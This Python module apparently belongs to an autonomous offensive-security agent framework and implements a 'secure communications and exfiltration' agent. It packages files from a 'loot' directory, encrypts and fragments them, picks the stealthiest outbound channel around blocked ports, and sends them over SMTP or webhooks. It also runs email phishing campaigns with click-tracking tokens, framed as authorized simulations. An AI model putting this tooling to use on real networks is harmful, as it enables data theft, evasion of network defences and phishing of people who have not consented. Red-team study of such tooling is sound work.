"""Cerebro Secure Communications & Exfiltration (CSCE)."""

from __future__ import annotations

import base64
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime
import hashlib
import io
import json
import os
from pathlib import Path
import secrets
import smtplib
import socket
import ssl
import subprocess
import tempfile
from typing import Any, Dict, Iterable, List, Mapping, Optional, Protocol, Sequence
from urllib.request import Request, urlopen
import zipfile

from openai import AsyncOpenAI

from cerberus.memory.logic import clean, clean_data
from cerberus.sdk.agents import Agent, ModelSettings, OpenAIChatCompletionsModel
from cerberus.tools.misc.reasoning import MODE_CRITIQUE, MODE_STRATEGY, REASONING_TOOL
from cerberus.tools.runners.local import PathGuard
from cerberus.tools.workspace import get_project_space
from cerberus.util import create_system_prompt_renderer

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except Exception:  # pragma: no cover - fallback to openssl CLI
    AESGCM = None


@dataclass
class ExfiltrationState:
    session_id: str
    phase: str = "Data Packaging"
    packaged_files: List[str] = field(default_factory=list)
    selected_channel: str = ""
    transmissions: List[Dict[str, Any]] = field(default_factory=list)
    verified: bool = False


@dataclass
class TransmissionRecord:
    timestamp: str
    session_id: str
    protocol: str
    destination: str
    priority: str
    payload_sha256: str
    bytes_sent: int
    status: str


class ChannelAdapter(Protocol):
    name: str

    async def send(self, *, destination: str, payload: bytes, metadata: Mapping[str, Any]) -> Dict[str, Any]:
        ...


class SMTPAdapter:
    name = "smtp"

    async def send(self, *, destination: str, payload: bytes, metadata: Mapping[str, Any]) -> Dict[str, Any]:
        relay = str(metadata.get("smtp_host") or "localhost")
        sender = str(metadata.get("sender") or "cerebro@localhost")
        port = int(metadata.get("smtp_port") or 587)
        use_tls = bool(metadata.get("use_tls", True))

        subject = str(metadata.get("subject") or "CSCE Transmission")
        encoded = base64.b64encode(payload).decode("ascii")
        message = (
            f"From: {sender}\r\n"
            f"To: {destination}\r\n"
            f"Subject: {subject}\r\n"
            f"X-CSCE-Session: {metadata.get('session_id', 'unknown')}\r\n"
            "MIME-Version: 1.0\r\n"
            "Content-Type: text/plain; charset=utf-8\r\n"
            "\r\n"
            f"{encoded}\r\n"
        )

        try:
            if port == 465:
                with smtplib.SMTP_SSL(relay, port, timeout=12, context=ssl.create_default_context()) as server:
                    if metadata.get("smtp_user") and metadata.get("smtp_password"):
                        server.login(str(metadata["smtp_user"]), str(metadata["smtp_password"]))
                    server.sendmail(sender, [destination], message)
            else:
                with smtplib.SMTP(relay, port, timeout=12) as server:
                    if use_tls:
                        server.starttls(context=ssl.create_default_context())
                    if metadata.get("smtp_user") and metadata.get("smtp_password"):
                        server.login(str(metadata["smtp_user"]), str(metadata["smtp_password"]))
                    server.sendmail(sender, [destination], message)
            return {"ok": True}
        except Exception as exc:  # pragma: no cover - runtime network behavior
            return {"ok": False, "error": {"message": str(exc)}}


class WebhookAdapter:
    name = "webhook"

    async def send(self, *, destination: str, payload: bytes, metadata: Mapping[str, Any]) -> Dict[str, Any]:
        body = {
            "session_id": metadata.get("session_id", "unknown"),
            "priority": metadata.get("priority", "normal"),
            "payload_b64": base64.b64encode(payload).decode("ascii"),
            "sha256": hashlib.sha256(payload).hexdigest(),
        }
        data = json.dumps(body, ensure_ascii=True).encode("utf-8")
        req = Request(str(destination), data=data, method="POST", headers={"Content-Type": "application/json"})
        try:
            with urlopen(req, timeout=12) as resp:  # nosec B310
                return {"ok": 200 <= int(resp.status) < 300, "status": int(resp.status)}
        except Exception as exc:  # pragma: no cover - runtime network behavior
            return {"ok": False, "error": {"message": str(exc)}}


class EncryptedMessagingAdapter:
    """Protocol-agnostic encrypted messaging placeholder (extensible for Slack/Teams)."""

    name = "encrypted_message"

    async def send(self, *, destination: str, payload: bytes, metadata: Mapping[str, Any]) -> Dict[str, Any]:
        # Intentionally generic: destination can be queue name, URI, or channel identifier.
        _ = metadata
        return {"ok": bool(destination), "status": "queued", "bytes": len(payload)}


class CerebroSecureCommAgent:
    """Autonomous secure communications, exfiltration, phishing, and alerting engine."""

    def __init__(self, *, workspace_root: Optional[str] = None, fragment_size: int = 262_144) -> None:
        self.workspace_root = self._resolve_workspace(workspace_root)
        self.loot_root = (self.workspace_root / "loot").resolve()
        self.audit_root = (self.workspace_root / "audit").resolve()
        self.audit_log = (self.audit_root / "guardrail_events.log").resolve()
        self.transmission_log = (self.audit_root / "transmission_log.jsonl").resolve()
        self.phish_metrics_path = (self.audit_root / "phishing_metrics.json").resolve()
        self.fragment_size = max(32_768, int(fragment_size))

        self.audit_root.mkdir(parents=True, exist_ok=True)
        self.loot_root.mkdir(parents=True, exist_ok=True)

        self._path_guard = PathGuard(self.workspace_root)
        self.adapters: Dict[str, ChannelAdapter] = {
            "smtp": SMTPAdapter(),
            "webhook": WebhookAdapter(),
            "encrypted_message": EncryptedMessagingAdapter(),
        }

    async def run_exfiltration_loop(
        self,
        *,
        destinations: Mapping[str, str],
        network_intel: Optional[Mapping[str, Any]] = None,
        priority: str = "normal",
        metadata: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        state = ExfiltrationState(session_id=datetime.now(tz=UTC).strftime("CSCE_%Y%m%dT%H%M%S"))
        extra = dict(metadata or {})

        # Phase 1: Data Packaging
        state.phase = "Data Packaging"
        package = self._package_encrypt_fragment(session_id=state.session_id)
        if not package.get("ok"):
            return package
        fragments: List[bytes] = package["fragments"]
        state.packaged_files = package["source_files"]

        # Phase 2: Channel Selection
        state.phase = "Channel Selection"
        selected = self._select_channel(destinations=destinations, network_intel=network_intel, priority=priority)
        state.selected_channel = selected

        # Phase 3: Transmission
        state.phase = "Transmission"
        adapter = self.adapters[selected]
        destination = destinations.get(selected, "")
        if not destination:
            return {"ok": False, "error": {"message": f"Missing destination for channel: {selected}"}}

        for idx, fragment in enumerate(fragments):
            scrub = self._metadata_scrub(
                session_id=state.session_id,
                protocol=selected,
                destination=destination,
                payload=fragment,
                metadata=extra,
            )
            if not scrub.get("ok"):
                return scrub

            send_meta = {
                **extra,
                "session_id": state.session_id,
                "priority": priority,
                "subject": f"CSCE fragment {idx + 1}/{len(fragments)}",
                "smtp_port": scrub.get("smtp_port"),
            }
            result = await adapter.send(destination=destination, payload=fragment, metadata=send_meta)
            payload_sha = hashlib.sha256(fragment).hexdigest()
            state.transmissions.append({"index": idx, "ok": bool(result.get("ok")), "sha256": payload_sha, "response": clean_data(result)})

            self._forensic_log(
                TransmissionRecord(
                    timestamp=datetime.now(tz=UTC).isoformat(),
                    session_id=state.session_id,
                    protocol=selected,
                    destination=destination,
                    priority=priority,
                    payload_sha256=payload_sha,
                    bytes_sent=len(fragment),
                    status="sent" if result.get("ok") else "failed",
                )
            )
            if not result.get("ok"):
                return {"ok": False, "error": {"message": "Transmission failed", "details": clean_data(result)}, "state": asdict(state)}

        # Phase 4: Verification
        state.phase = "Verification"
        verified = self._verify_transmissions(state)
        state.verified = verified
        return {"ok": verified, "state": asdict(state), "session_key_b64": package["session_key_b64"], "channel": selected}

    async def send_priority_alert(
        self,
        *,
        event: str,
        severity: str,
        destinations: Mapping[str, str],
        network_intel: Optional[Mapping[str, Any]] = None,
        details: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        priority = "urgent" if severity.lower() in {"critical", "high", "urgent"} else "normal"
        message = {
            "event": event,
            "severity": severity,
            "timestamp": datetime.now(tz=UTC).isoformat(),
            "details": clean_data(details or {}),
        }
        payload = json.dumps(message, ensure_ascii=True).encode("utf-8")

        selected = self._select_channel(destinations=destinations, network_intel=network_intel, priority=priority)
        destination = destinations.get(selected, "")
        if not destination:
            return {"ok": False, "error": {"message": f"No destination configured for {selected}"}}

        scrub = self._metadata_scrub(
            session_id=f"ALERT_{datetime.now(tz=UTC).strftime('%H%M%S')}",
            protocol=selected,
            destination=destination,
            payload=payload,
            metadata={"subject": f"Urgent: {event}"},
        )
        if not scrub.get("ok"):
            return scrub

        result = await self.adapters[selected].send(destination=destination, payload=payload, metadata={"priority": priority, "subject": f"Urgent {event}", "smtp_port": scrub.get("smtp_port")})
        record = TransmissionRecord(
            timestamp=datetime.now(tz=UTC).isoformat(),
            session_id=scrub.get("session_id", "alert"),
            protocol=selected,
            destination=destination,
            priority=priority,
            payload_sha256=hashlib.sha256(payload).hexdigest(),
            bytes_sent=len(payload),
            status="sent" if result.get("ok") else "failed",
        )
        self._forensic_log(record)
        return {"ok": bool(result.get("ok")), "channel": selected, "result": clean_data(result)}

    async def orchestrate_phishing_simulation(
        self,
        *,
        campaign_name: str,
        targets: Sequence[Mapping[str, str]],
        relay: Mapping[str, Any],
        template: str,
        research_context: str,
    ) -> Dict[str, Any]:
        strategy = REASONING_TOOL.reason(
            mode=MODE_STRATEGY,
            objective="Generate authorized phishing simulation plan and email variants",
            context=f"campaign={campaign_name} targets={len(targets)} research={research_context}",
            options=["credential harvest simulation", "attachment awareness simulation", "MFA prompt simulation"],
            fetch_facts=False,
        )

        metrics = self._load_phish_metrics()
        sent = 0
        for idx, target in enumerate(targets):
            token = secrets.token_urlsafe(12)
            click_url = f"{relay.get('tracking_base', 'https://training.local/click')}/{token}"
            rendered = self._render_template(template=template, target=target, click_url=click_url, campaign_name=campaign_name, research_context=research_context)

            meta = {
                "sender": relay.get("sender", "security-awareness@training.local"),
                "smtp_host": relay.get("smtp_host", "localhost"),
                "smtp_user": relay.get("smtp_user"),
                "smtp_password": relay.get("smtp_password"),
                "smtp_port": int(relay.get("smtp_port", 587)),
                "subject": relay.get("subject", f"{campaign_name} security simulation"),
                "session_id": f"PHISH_{campaign_name}_{idx}",
            }

            result = await self.adapters["smtp"].send(destination=str(target.get("email", "")), payload=rendered.encode("utf-8"), metadata=meta)
            if result.get("ok"):
                sent += 1
                metrics["tokens"][token] = {
                    "target": target,
                    "campaign": campaign_name,
                    "sent_at": datetime.now(tz=UTC).isoformat(),
                    "clicked": False,
                }

        metrics["campaigns"][campaign_name] = {
            "sent": sent,
            "targets": len(targets),
            "strategy_summary": strategy.get("summary", ""),
            "updated_at": datetime.now(tz=UTC).isoformat(),
        }
        self._save_phish_metrics(metrics)
        return {"ok": True, "campaign": campaign_name, "sent": sent, "targets": len(targets), "strategy": strategy}

    def record_phish_click(self, *, token: str) -> Dict[str, Any]:
        metrics = self._load_phish_metrics()
        payload = metrics.get("tokens", {}).get(token)
        if not payload:
            return {"ok": False, "error": {"message": "Unknown click token"}}
        payload["clicked"] = True
        payload["clicked_at"] = datetime.now(tz=UTC).isoformat()
        self._save_phish_metrics(metrics)
        return {"ok": True, "token": token, "campaign": payload.get("campaign")}

    def _package_encrypt_fragment(self, *, session_id: str) -> Dict[str, Any]:
        loot_files = self._collect_loot_files()
        if not loot_files:
            return {"ok": False, "error": {"message": "No loot files available for exfiltration"}}

        archive = io.BytesIO()
        with zipfile.ZipFile(archive, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
            for path in loot_files:
                rel = path.relative_to(self.workspace_root)
                zf.write(path, arcname=str(rel))
        packaged = archive.getvalue()

        session_key = secrets.token_bytes(32)
        encrypted = self._aes256_encrypt(payload=packaged, session_key=session_key, associated_data=session_id.encode("utf-8"))
        if encrypted is None:
            return {"ok": False, "error": {"message": "AES-256 backend unavailable"}}

        fragments = [encrypted[i : i + self.fragment_size] for i in range(0, len(encrypted), self.fragment_size)]
        return {
            "ok": True,
            "source_files": [str(p.relative_to(self.workspace_root)) for p in loot_files],
            "fragments": fragments,
            "session_key_b64": base64.b64encode(session_key).decode("ascii"),
        }

    def _aes256_encrypt(self, *, payload: bytes, session_key: bytes, associated_data: bytes) -> Optional[bytes]:
        if len(session_key) != 32:
            return None

        if AESGCM is not None:
            nonce = secrets.token_bytes(12)
            cipher = AESGCM(session_key)
            encrypted = cipher.encrypt(nonce, payload, associated_data)
            return nonce + encrypted

        # Fallback to openssl for environments without cryptography wheel.
        openssl = "openssl"
        if not shutil_which(openssl):
            return None
        with tempfile.NamedTemporaryFile(delete=False) as src, tempfile.NamedTemporaryFile(delete=False) as dst:
            src.write(payload)
            src.flush()
            passphrase = base64.b64encode(session_key).decode("ascii")
            cmd = [openssl, "enc", "-aes-256-cbc", "-pbkdf2", "-salt", "-in", src.name, "-out", dst.name, "-pass", f"pass:{passphrase}"]
            result = subprocess.run(cmd, capture_output=True, text=True, check=False)  # nosec B603
            if result.returncode != 0:
                return None
            data = Path(dst.name).read_bytes()
            Path(src.name).unlink(missing_ok=True)
            Path(dst.name).unlink(missing_ok=True)
            return data

    def _select_channel(
        self,
        *,
        destinations: Mapping[str, str],
        network_intel: Optional[Mapping[str, Any]],
        priority: str,
    ) -> str:
        intel = dict(network_intel or {})
        blocked_ports = {int(x) for x in intel.get("blocked_ports", []) if str(x).isdigit()}
        allowed_protocols = {str(x).lower() for x in intel.get("allowed_protocols", [])}

        strategy = REASONING_TOOL.reason(
            mode=MODE_STRATEGY,
            objective="Choose stealthiest viable outbound communication channel",
            context=json.dumps({"blocked_ports": sorted(blocked_ports), "allowed_protocols": sorted(allowed_protocols), "priority": priority}, ensure_ascii=True),
            options=["smtp:587", "smtp:465", "webhook:https", "encrypted_message"],
            fetch_facts=False,
        )
        _ = strategy

        if "smtp" in destinations:
            if 587 not in blocked_ports and (not allowed_protocols or "smtp" in allowed_protocols):
                return "smtp"
            if 465 not in blocked_ports and (not allowed_protocols or "smtp" in allowed_protocols):
                return "smtp"
        if "webhook" in destinations and (not allowed_protocols or "https" in allowed_protocols or "webhook" in allowed_protocols):
            return "webhook"
        if "encrypted_message" in destinations:
            return "encrypted_message"
        return next(iter(destinations.keys()), "webhook")

    def _metadata_scrub(
        self,
        *,
        session_id: str,
        protocol: str,
        destination: str,
        payload: bytes,
        metadata: Mapping[str, Any],
    ) -> Dict[str, Any]:
        preview = payload[:1200].decode("utf-8", errors="replace")
        host = socket.gethostname()
        violations: List[str] = []

        if str(self.workspace_root) in preview:
            violations.append("workspace_path_leak")
        if host and host in preview:
            violations.append("host_identifier_leak")
        if clean(preview) != preview:
            violations.append("unredacted_secret_or_pii")

        critique = REASONING_TOOL.reason(
            mode=MODE_CRITIQUE,
            objective="Metadata scrub before external transmission",
            context=json.dumps({"protocol": protocol, "destination": destination, "metadata": clean_data(dict(metadata)), "violations": violations}, ensure_ascii=True),
            prior_output=preview[:800],
            options=["send", "block"],
            fetch_facts=False,
        )

        pivot = (critique.get("pivot_request") or {}) if isinstance(critique, Mapping) else {}
        if violations or pivot.get("required"):
            return {
                "ok": False,
                "error": {
                    "message": "Metadata scrub blocked transmission",
                    "violations": violations,
                    "critique": critique,
                },
            }

        smtp_port = int(metadata.get("smtp_port", 587))
        return {"ok": True, "session_id": session_id, "smtp_port": smtp_port}

    def _verify_transmissions(self, state: ExfiltrationState) -> bool:
        if not state.transmissions:
            return False
        return all(bool(item.get("ok")) for item in state.transmissions)

    def _collect_loot_files(self) -> List[Path]:
        files: List[Path] = []
        for path in self.loot_root.rglob("*"):
            if not path.is_file():
                continue
            try:
                path.relative_to(self.loot_root)
            except ValueError:
                continue
            tokens = [str(path)]
            self._path_guard.validate_command(tokens)
            files.append(path.resolve())
        return files

    def _forensic_log(self, record: TransmissionRecord) -> None:
        line = json.dumps(clean_data(asdict(record)), ensure_ascii=True) + "\n"
        with self.transmission_log.open("a", encoding="utf-8") as handle:
            handle.write(line)

    def _render_template(
        self,
        *,
        template: str,
        target: Mapping[str, str],
        click_url: str,
        campaign_name: str,
        research_context: str,
    ) -> str:
        body = template
        body = body.replace("{{name}}", str(target.get("name", "Operator")))
        body = body.replace("{{email}}", str(target.get("email", "unknown@example.com")))
        body = body.replace("{{click_url}}", click_url)
        body = body.replace("{{campaign}}", campaign_name)
        body = body.replace("{{context}}", research_context)
        return body

    def _load_phish_metrics(self) -> Dict[str, Any]:
        if not self.phish_metrics_path.exists():
            return {"campaigns": {}, "tokens": {}}
        try:
            return json.loads(self.phish_metrics_path.read_text(encoding="utf-8"))
        except Exception:
            return {"campaigns": {}, "tokens": {}}

    def _save_phish_metrics(self, payload: Mapping[str, Any]) -> None:
        self.phish_metrics_path.write_text(json.dumps(clean_data(dict(payload)), ensure_ascii=True, indent=2), encoding="utf-8")

    @staticmethod
    def _resolve_workspace(workspace_root: Optional[str]) -> Path:
        if workspace_root:
            return Path(workspace_root).expanduser().resolve()
        try:
            return get_project_space().ensure_initialized().resolve()
        except Exception:
            return Path.cwd().resolve()


def shutil_which(name: str) -> Optional[str]:
    from shutil import which

    return which(name)


load_dotenv = None
try:
    from dotenv import load_dotenv as _load_dotenv

    load_dotenv = _load_dotenv
except Exception:
    pass

if load_dotenv:
    load_dotenv()

mail_prompt = """You are Cerebro Secure Communications & Exfiltration (CSCE).\nUse structured transmission workflows and maintain forensic logs."""

csce_agent = Agent(
    name="CSCE Agent",
    description="Secure communications and exfiltration orchestrator with phishing simulation and alerting.",
    instructions=create_system_prompt_renderer(mail_prompt),
    model_settings=ModelSettings(temperature=0, tool_choice="required"),
    tools=[],
    model=OpenAIChatCompletionsModel(
        model=os.getenv("CERBERUS_MODEL", "cerebro1"),
        openai_client=AsyncOpenAI(api_key=os.getenv("CERBERUS_API_KEY", os.getenv("OPENAI_API_KEY", "sk-cerebro-1234567890"))),
    ),
)

# Backward-compatible export used by existing agentic patterns.
dns_smtp_agent = csce_agent
cerebro_secure_comm_agent = CerebroSecureCommAgent()


__all__ = [
    "ExfiltrationState",
    "TransmissionRecord",
    "CerebroSecureCommAgent",
    "cerebro_secure_comm_agent",
    "csce_agent",
    "dns_smtp_agent",
]
